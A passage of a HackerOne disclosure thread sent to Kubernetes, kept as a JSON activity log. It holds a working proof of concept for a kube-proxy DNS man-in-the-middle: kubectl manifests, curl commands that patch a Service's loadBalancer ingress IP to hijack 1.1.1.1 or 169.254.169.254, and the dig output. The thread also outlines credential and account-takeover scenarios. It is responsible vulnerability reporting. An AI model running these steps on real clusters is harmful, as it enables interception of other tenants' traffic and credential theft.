+      "created_at": "2019-12-27T14:09:55.116Z",
+      "updated_at": "2019-12-27T14:09:55.116Z",
+      "actor": {
+        "username": "h1_analyst_leon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_leon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6636875,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hi @champtar - Thanks for the well-written report. Can you help me understand the impact? What would be a real-world attack scenario using this?  ",
+      "automated_response": false,
+      "created_at": "2019-12-27T17:05:42.529Z",
+      "updated_at": "2019-12-27T17:05:42.529Z",
+      "actor": {
+        "username": "h1_analyst_leon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_leon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6637481,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hi @tuxedo.\nIt really depends if your cluster is multi-tenant or not (or prod + dev), and if you are using end to end encryption or not (with proper certificate verification for TLS).\nAs far as I know K8S internal communications are all properly encrypted and certificates are verified, so for the kubernetes core components MITM only gives you DOS abilities.\n\nNow for a real world scenario, in a multi-tenant cluster, namespace A is running some kind of website with a mysql database without encryption (or without checking the certs), someone in namespace B can deploy a service and MITM the connection to the database, allowing them to either get the credentials or an authenticated connection and dump the DB.\nIf namespace A is sending emails using normal unencrypted SMTP, namespace B can just MITM all the MX servers of the admin email domain, then ask to reset the password, intercept the reset email, success (account takeover).\nMulti-tenant can just be multi team.\n\nNot validated yet (I'll try to put a POC together soon), we might also be able to intercept UDP, so DNS.\n\nSingle tenant / environment cluster are not a big concern, as you do require the ability to create K8S services.",
+      "automated_response": false,
+      "created_at": "2019-12-27T19:33:38.188Z",
+      "updated_at": "2019-12-27T19:33:38.188Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6638272,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Here the DNS MITM POC, it's 1a but for UDP port 53, works with iptables. On GKE it works for maybe 30sec (intercepting 169.254.169.254) then goes back to normal server.\n(Haven't tried with IPVS yet)\n\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Pod\nmetadata:\n  name: dig-pod\nspec:\n  containers:\n    - name: dig\n      image: sequenceiq/alpine-dig:latest\n      command: [ \"/bin/sleep\", \"3600\" ]\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: dig-node\nspec:\n  hostNetwork: true\n  containers:\n    - name: dig\n      image: sequenceiq/alpine-dig:latest\n      command: [ \"/bin/sleep\", \"3600\" ]\nEOF\n```\n```\nkubectl exec dig-pod -- dig kubernetes.io @1.1.1.1\nkubectl exec dig-node -- dig kubernetes.io @1.1.1.1\n```\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: kubeproxy-mitm\n---\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: echoserver-dns\n  namespace: kubeproxy-mitm\ndata:\n  Corefile: |\n    kubernetes.io:53 {\n        errors\n        log\n        health\n        ready\n        whoami\n    }\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver-dns\n  namespace: kubeproxy-mitm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: echoserver-dns\n  template:\n    metadata:\n      labels:\n        app: echoserver-dns\n    spec:\n      containers:\n      - args:\n        - -conf\n        - /etc/coredns/Corefile\n        image: docker.io/coredns/coredns:1.6.0\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /health\n            port: 8080\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: coredns\n        ports:\n        - containerPort: 53\n          name: dns\n          protocol: UDP\n        - containerPort: 53\n          name: dns-tcp\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /ready\n            port: 8181\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n        terminationMessagePath: /dev/termination-log\n        terminationMessagePolicy: File\n        volumeMounts:\n        - mountPath: /etc/coredns\n          name: config-volume\n      volumes:\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: Corefile\n            path: Corefile\n          name: echoserver-dns\n        name: config-volume\nEOF\n```\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-external-lb-dns\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: dnsu\n    port: 53\n    targetPort: 53\n    protocol: UDP\n  selector:\n    app: echoserver-dns\n  type: LoadBalancer\nEOF\nkubectl proxy --port=8080 &\nsleep 3\ncurl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-external-lb-dns/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\":\"1.1.1.1\"}]}}}'\npkill kubectl\n```\n```\n# kubectl exec dig-node -- dig kubernetes.io @1.1.1.1\n\n; <<>> DiG 9.10.2 <<>> kubernetes.io @1.1.1.1\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 11733\n;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 3\n;; WARNING: recursion requested but not available\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n;; QUESTION SECTION:\n;kubernetes.io.\t\t\tIN\tA\n\n;; ADDITIONAL SECTION:\nkubernetes.io.\t\t0\tIN\tA\t10.10.52.143\n_udp.kubernetes.io.\t0\tIN\tSRV\t0 0 58624 .\n\n;; Query time: 0 msec\n;; SERVER: 1.1.1.1#53(1.1.1.1)\n;; WHEN: Fri Dec 27 23:17:04 UTC 2019\n;; MSG SIZE  rcvd: 108\n\n# kubectl exec dig-pod -- dig kubernetes.io @1.1.1.1\n\n; <<>> DiG 9.10.2 <<>> kubernetes.io @1.1.1.1\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 64508\n;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 3\n;; WARNING: recursion requested but not available\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n;; QUESTION SECTION:\n;kubernetes.io.\t\t\tIN\tA\n\n;; ADDITIONAL SECTION:\nkubernetes.io.\t\t0\tIN\tA\t10.233.111.0\n_udp.kubernetes.io.\t0\tIN\tSRV\t0 0 41665 .\n\n;; Query time: 1 msec\n;; SERVER: 1.1.1.1#53(1.1.1.1)\n;; WHEN: Fri Dec 27 23:17:09 UTC 2019\n;; MSG SIZE  rcvd: 108\n```\n\nWIth DNS MITM, you can do really fine grained DOS or MITM (for example just 1 S3 bucket, just 1 log server, ...)",
+      "automated_response": false,
+      "created_at": "2019-12-28T01:43:34.482Z",
+      "updated_at": "2019-12-28T01:43:34.482Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6660517,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @tuxedo,\nDo you have all the informations you need for now ?\n",
+      "automated_response": false,
+      "created_at": "2019-12-30T17:00:09.807Z",
+      "updated_at": "2019-12-30T17:00:09.807Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6669910,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello and happy new year !!\n\nFor the DNS MITM, I confirm it works with IPVS and with GKE. For GKE you just need to wait for GKE to assign an IP then patch again the service and the MITM stays active.",
+      "automated_response": false,
+      "created_at": "2020-01-02T00:39:45.852Z",
+      "updated_at": "2020-01-02T00:39:45.852Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6675528,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hi @champtar - Happy New Year! Thank you for the additional impact information. When reproducing this, what am I supposed to be looking for when testing if the MITM works? If possible, can you also please include a video demonstrating how to reproduce this? Thanks! ",
+      "automated_response": false,
+      "created_at": "2020-01-02T18:24:05.336Z",
+      "updated_at": "2020-01-02T18:24:05.336Z",
+      "actor": {
+        "username": "h1_analyst_leon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_leon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6675806,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hi @tuxedo, the idea is pretty simple, you do a request before, see that the response comes from say cloudflare (for 1.1.1.1), put in place the MITM, see that the response comes from the echo server.\nYou already have all the reproduction steps ready to be copy pasted, what issue are you facing ? On what cluster/version are you trying to reproduce this ?",
+      "automated_response": false,
+      "created_at": "2020-01-02T19:08:03.758Z",
+      "updated_at": "2020-01-02T19:08:03.758Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6690868,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Attached 3 .cast file that you can play with `asciinema play a.cast` (https://asciinema.org/docs/installation)\nI've improved a bit the GKE version, by putting `loadBalancerIP: 169.254.169.254` the Google LoadBalancer controller doesn't change the IP after we patch it (no need to wait for the balancer to affect an ip and then patch it)\n",
+      "automated_response": false,
+      "created_at": "2020-01-04T22:35:15.657Z",
+      "updated_at": "2020-01-04T22:35:15.657Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 675439,
+          "filename": "1-cluster-create.cast",
+          "type": "application/octet-stream",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/g7x1zY2hjYZcWc5drL4Gprda?response-content-disposition=attachment%3B%20filename%3D%221-cluster-create.cast%22%3B%20filename%2A%3DUTF-8%27%271-cluster-create.cast&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070752Z&X-Amz-Expires=1322&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a8fbd85ffd25848ffc78b704af423e321575dbb9e26b32cd3ac4f1fcbb4ba981"
+        },
+        {
+          "id": 675438,
+          "filename": "3-mitm.cast",
+          "type": "application/octet-stream",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/obtQTiahJsTfKkJkkpMxKgG2?response-content-disposition=attachment%3B%20filename%3D%223-mitm.cast%22%3B%20filename%2A%3DUTF-8%27%273-mitm.cast&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070752Z&X-Amz-Expires=1322&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=210e921b08a1789a8f049ab1c89f5512ca2377e4db4b4e165f589fdc4d46bd1b"
+        },
+        {
+          "id": 675437,
+          "filename": "2-prechecks.cast",
+          "type": "application/octet-stream",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mRbHijpAjn7QLV5wEWcWSoNC?response-content-disposition=attachment%3B%20filename%3D%222-prechecks.cast%22%3B%20filename%2A%3DUTF-8%27%272-prechecks.cast&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070752Z&X-Amz-Expires=1322&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6c33b094c849e258f93b99ce67dfb03f5abaf587b2959838f0a02def18cac17d"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6690950,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Another variant sending the traffic externaly\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: kubeproxy-mitm\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-external-lb-dns\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: dnsu\n    port: 53\n    targetPort: 53\n    protocol: UDP\n  type: LoadBalancer\n  loadBalancerIP: 169.254.169.254\n---\napiVersion: v1\nkind: Endpoints\nmetadata:\n  name: mitm-external-lb-dns\n  namespace: kubeproxy-mitm\nsubsets:\n- addresses:\n  - ip: 1.1.1.1\n  ports:\n  - name: dnsu\n    port: 53\n    protocol: UDP\nEOF\n\nkubectl proxy --port=8080 &\nsleep 3\ncurl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-external-lb-dns/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\":\"169.254.169.254\"}]}}}'\npkill kubectl\n\nkubectl exec dig-pod -- dig CH TXT version.server @169.254.169.254\nkubectl exec dig-node -- dig CH TXT version.server @169.254.169.254\n```\n\nIn the response you see `version.server.\t\t0\tCH\tTXT\t\"cloudflare-resolver-2019.11.0\"`",
+      "automated_response": false,
+      "created_at": "2020-01-04T23:05:31.875Z",
+      "updated_at": "2020-01-04T23:05:31.875Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 675475,
+          "filename": "4-mitm-endpoints.cast",
+          "type": "application/octet-stream",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/o2ouLAj9DxXqhUKWePAWvTne?response-content-disposition=attachment%3B%20filename%3D%224-mitm-endpoints.cast%22%3B%20filename%2A%3DUTF-8%27%274-mitm-endpoints.cast&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070752Z&X-Amz-Expires=1322&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a479f73e1b7f8db01892fe4ed43fcb44e725441e1768e8a63db10da291c07af3"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6722550,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @tuxedo, I see status is still \"new\", do you have anything you need ?",
+      "automated_response": false,
+      "created_at": "2020-01-09T03:25:33.305Z",
+      "updated_at": "2020-01-09T03:25:33.305Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
